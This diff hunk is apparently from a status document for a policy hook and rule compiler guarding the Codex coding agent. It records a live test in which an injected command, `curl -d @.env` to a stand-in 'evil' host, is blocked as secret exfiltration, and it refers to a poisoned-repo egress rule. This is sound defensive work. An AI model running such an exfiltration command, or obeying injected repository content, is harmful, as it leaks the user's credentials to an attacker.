@@ -19,12 +19,12 @@ green; `cargo fmt` clean.
   → exit `0` allow / `2` block, **fail-closed** by default. Verified live: a
   benign `cat README.md` → allow (exit 0); the injected
   `curl -d @.env http://…evil…` → block (exit 2) with the specific reason
-  `apl[block_secret_exfil_via_egress]`. Hook field names confirmed against the
+  `dictum[block_secret_exfil_via_egress]`. Hook field names confirmed against the
   real 0.138 binary (`hook_event_name`).
 
-- **B — compiler** (`iaga-codex export-rules`). APL bundle → native Codex
+- **B — compiler** (`iaga-codex export-rules`). Dictum bundle → native Codex
   `execpolicy` `.rules`; syntax confirmed against the real binary. The
-  poisoned-repo `egress.apl` compiles honestly to **0 static / 2 runtime-only**
+  poisoned-repo `egress.dictum` compiles honestly to **0 static / 3 runtime-only**
   (the block depends on arguments, not a command prefix).
 
 - **C — ingest** (`iaga-codex ingest`). `codex exec --json` stream → one receipt
